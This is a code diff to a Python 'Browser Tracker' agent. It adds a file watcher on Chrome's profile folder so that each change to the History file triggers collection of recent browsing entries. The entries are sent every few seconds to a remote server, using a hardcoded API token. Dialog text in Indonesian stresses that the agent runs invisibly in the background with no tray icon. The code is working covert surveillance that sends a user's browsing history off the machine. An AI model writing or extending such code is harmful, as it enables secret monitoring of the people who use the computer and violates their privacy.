@@ -31,14 +31,48 @@ try:
 except ImportError:
     TRAY_AVAILABLE = False
 
+try:
+    from watchdog.observers import Observer
+    from watchdog.events import FileSystemEventHandler
+    WATCHDOG_AVAILABLE = True
+except ImportError:
+    WATCHDOG_AVAILABLE = False
+
+class ChromeHistoryWatcher(FileSystemEventHandler):
+    """File system watcher for Chrome history changes"""
+
+    def __init__(self, agent_callback):
+        self.agent_callback = agent_callback
+        self.last_check = time.time()
+        self.cooldown = 8  # 8 seconds cooldown for responsiveness
+
+    def on_modified(self, event):
+        """Handle file modification events"""
+        if event.is_directory:
+            return
+
+        # Check if it's a Chrome History file
+        if event.src_path.endswith('History'):
+            current_time = time.time()
+
+            # Cooldown to avoid multiple triggers
+            if current_time - self.last_check > self.cooldown:
+                self.last_check = current_time
+                print(f"🔔 Chrome history changed: {event.src_path}")
+
+                # Trigger data collection with delay (Chrome needs time to write)
+                threading.Timer(3.0, self.agent_callback).start()
+
 class BrowserAgent:
-    """Integrated browser tracking agent"""
+    """Integrated real-time browser tracking agent"""
 
     def __init__(self, gui_callback=None):
         self.gui_callback = gui_callback
         self.running = False
         self.client_id = None
         self.monitor_thread = None
+        self.observer = None
+        self.realtime_mode = True
 
         # User data directory for storage
         self.user_data_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "BrowserTracker")
@@ -48,15 +82,26 @@ class BrowserAgent:
         self.config = {
             "server_url": "https://browser-tracking.vercel.app",
             "api_token": "BrowserTracker2024SecureToken",
-            "check_interval": 60,
-            "batch_size": 50
+            "check_interval": 15,  # 15 seconds for responsive monitoring
+            "batch_size": 25,  # Good batch size for fresh data
+            "realtime_interval": 8   # 8 seconds for enhanced mode
         }
 
         # Data tracking
-        self.sent_data_file = os.path.join(self.user_data_dir, 'sent_data.json')
+        self.sent_data_file = os.path.join(self.user_data_dir, 'sent_data_realtime.json')
         self.sent_data_hashes = self.load_sent_data()
 
-        self.log("Browser Agent initialized")
+        # Chrome paths to monitor
+        self.chrome_base = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
+
+        self.log("🚀 Real-time Browser Agent initialized")
+        self.log(f"📁 Data directory: {self.user_data_dir}")
+        self.log(f"🌐 Server: {self.config['server_url']}")
+        self.log(f"👀 Monitoring: {self.chrome_base}")
+
+        if not WATCHDOG_AVAILABLE:
+            self.log("⚠️ Watchdog not available - using periodic mode only")
+            self.realtime_mode = False
 
     def log(self, message):
         """Log message to GUI if available"""
@@ -330,8 +375,51 @@ class BrowserAgent:
             self.log(f"❌ Error registering client: {e}")
             return False
 
+    # Removed complex real-time history method - using standard collection instead
+
+    def collect_and_send_realtime(self):
+        """Real-time data collection and transmission"""
+        try:
+            self.log(f"⚡ Quick collection triggered ({datetime.now().strftime('%H:%M:%S')})")
+
+            # Ensure client is registered
+            if not self.client_id:
+                if not self.register_client():
+                    return False
+
+            # Use regular collection method but with smaller batch
+            history = self.get_chrome_history(10)  # Smaller batch for responsiveness
+            if not history:
+                return True
+
+            # Send browsing data
+            self.log(f"📤 Sending {len(history)} entries...")
+            success, response = self.send_data('browsing-data', {
+                'client_id': self.client_id,
+                'browsing_data': history
+            })
+
+            if success:
+                # Mark data as sent
+                for entry in history:
+                    entry_hash = self.create_data_hash(entry)
+                    self.sent_data_hashes.add(entry_hash)
+
+                # Save sent data hashes
+                self.save_sent_data()
+
+                self.log(f"✅ {len(history)} entries sent successfully")
+                return True
+            else:
+                self.log(f"❌ Failed to send data")
+                return False
+
+        except Exception as e:
+            self.log(f"❌ Error in collection: {e}")
+            return False
+
     def collect_and_send_data(self):
-        """Main data collection and transmission"""
+        """Main data collection and transmission (fallback/periodic)"""
         try:
             self.log(f"🔄 Collecting data... ({datetime.now().strftime('%H:%M:%S')})")
 
@@ -371,6 +459,47 @@ class BrowserAgent:
             self.log(f"❌ Error in collect_and_send_data: {e}")
             return False
 
+    def start_file_monitoring(self):
+        """Start file system monitoring for Chrome history changes"""
+        try:
+            if not WATCHDOG_AVAILABLE:
+                self.log("⚠️ Watchdog not available - skipping file monitoring")
+                return False
+
+            if not os.path.exists(self.chrome_base):
+                self.log("❌ Chrome directory not found for monitoring")
+                return False
+
+            self.log("👀 Starting file system monitoring...")
+
+            # Create event handler
+            event_handler = ChromeHistoryWatcher(self.collect_and_send_realtime)
+
+            # Create observer
+            self.observer = Observer()
+            self.observer.schedule(event_handler, self.chrome_base, recursive=True)
+            self.observer.start()
+
+            self.log("✅ File monitoring started - Real-time mode active")
+            return True
+
+        except Exception as e:
+            self.log(f"❌ Error starting file monitoring: {e}")
+            return False
+
+    def stop_file_monitoring(self):
+        """Stop file system monitoring"""
+        try:
+            if self.observer:
+                self.observer.stop()
+                self.observer.join()
+                self.log("🛑 File monitoring stopped")
+                return True
+            return False
+        except Exception as e:
+            self.log(f"❌ Error stopping file monitoring: {e}")
+            return False
+
     def start_monitoring(self):
         """Start monitoring in background thread"""
         if self.running:
@@ -379,6 +508,11 @@ class BrowserAgent:
 
         self.log("🚀 Starting Browser Tracking Agent...")
         self.running = True
+
+        # Start file monitoring if available
+        if self.realtime_mode:
+            self.start_file_monitoring()
+
         self.monitor_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
         self.monitor_thread.start()
         return True
@@ -392,6 +526,10 @@ class BrowserAgent:
         self.log("🛑 Stopping monitoring...")
         self.running = False
 
+        # Stop file monitoring
+        if self.realtime_mode:
+            self.stop_file_monitoring()
+
         if self.monitor_thread and self.monitor_thread.is_alive():
             self.monitor_thread.join(timeout=5)
 
@@ -401,23 +539,28 @@ class BrowserAgent:
         """Main monitoring loop"""
         self.log(f"🔄 Starting monitoring loop...")
 
+        # Use appropriate interval based on mode
+        if self.realtime_mode and WATCHDOG_AVAILABLE:
+            check_interval = self.config.get('realtime_interval', 10)  # 10 seconds
+            self.log(f"⚡ Real-time mode: File monitoring + {check_interval}s checks")
+        else:
+            check_interval = self.config.get('check_interval', 30)  # 30 seconds
+            self.log(f"🔄 Standard mode: Checking every {check_interval}s")
+
         while self.running:
             try:
                 # Collect and send data
                 self.collect_and_send_data()
 
                 # Wait for next collection
-                interval = self.config.get('check_interval', 60)
-                self.log(f"⏳ Next collection in {interval} seconds...")
-
-                for _ in range(interval):
+                for _ in range(check_interval):
                     if not self.running:
                         break
                     time.sleep(1)
 
             except Exception as e:
                 self.log(f"❌ Error in monitoring loop: {e}")
-                time.sleep(60)
+                time.sleep(30)  # Shorter retry interval
 
         self.log("🛑 Monitoring stopped")
 
@@ -489,12 +632,17 @@ class BrowserTrackerGUI:
         status_frame = ttk.LabelFrame(main_frame, text="Status", padding="10")
         status_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
         
-        self.status_label = ttk.Label(status_frame, text="Checking status...", 
+        self.status_label = ttk.Label(status_frame, text="Checking status...",
                                      font=("Arial", 10))
         self.status_label.grid(row=0, column=0, sticky=tk.W)
-        
+
         self.status_indicator = tk.Canvas(status_frame, width=20, height=20)
         self.status_indicator.grid(row=0, column=1, padx=(10, 0))
+
+        # Real-time mode indicator
+        self.realtime_label = ttk.Label(status_frame, text="",
+                                       font=("Arial", 9), foreground="blue")
+        self.realtime_label.grid(row=1, column=0, columnspan=2, sticky=tk.W, pady=(5, 0))
         
         # Control buttons frame
         control_frame = ttk.LabelFrame(main_frame, text="Controls", padding="10")
@@ -576,11 +724,20 @@ class BrowserTrackerGUI:
     def update_status(self, text, color):
         """Update status display"""
         self.status_label.config(text=text)
-        
+
         # Update status indicator
         self.status_indicator.delete("all")
         self.status_indicator.create_oval(2, 2, 18, 18, fill=color, outline="black")
-        
+
+        # Update monitoring mode indicator
+        if self.agent.running:
+            if self.agent.realtime_mode and WATCHDOG_AVAILABLE:
+                self.realtime_label.config(text="⚡ Enhanced monitoring (10s + file watch)", foreground="green")
+            else:
+                self.realtime_label.config(text="🔄 Standard monitoring (30s intervals)", foreground="orange")
+        else:
+            self.realtime_label.config(text="", foreground="gray")
+
         # Update buttons
         if self.agent.running:
             self.start_button.config(state="disabled")
@@ -654,8 +811,10 @@ class BrowserTrackerGUI:
         """Handle window close event"""
         if self.run_in_background.get():
             # Show notification about background operation
+            monitoring_status = "⚡ Enhanced monitoring" if self.agent.realtime_mode else "🔄 Standard monitoring"
             result = messagebox.askyesno("Run in Background",
                               "Browser Tracker akan tetap berjalan di background.\n\n"
+                              f"✅ {monitoring_status} aktif\n"
                               "✅ Agent akan terus mengumpulkan data browsing\n"
                               "✅ Tidak ada icon di system tray\n"
                               "✅ Berjalan secara invisible\n\n"
@@ -668,8 +827,10 @@ class BrowserTrackerGUI:
                 self.log("🔽 Running in background - No system tray")
 
                 # Optional: Show final notification
+                monitoring_info = "⚡ Enhanced monitoring (10s + file watch)" if self.agent.realtime_mode else "🔄 Standard monitoring (30s)"
                 messagebox.showinfo("Background Mode",
                                   "✅ Browser Tracker sekarang berjalan di background.\n\n"
+                                  f"{monitoring_info}\n"
                                   "Agent akan terus mengumpulkan data browsing.\n"
                                   "Tidak ada icon di system tray.\n\n"
                                   "Untuk membuka: Jalankan aplikasi lagi\n"
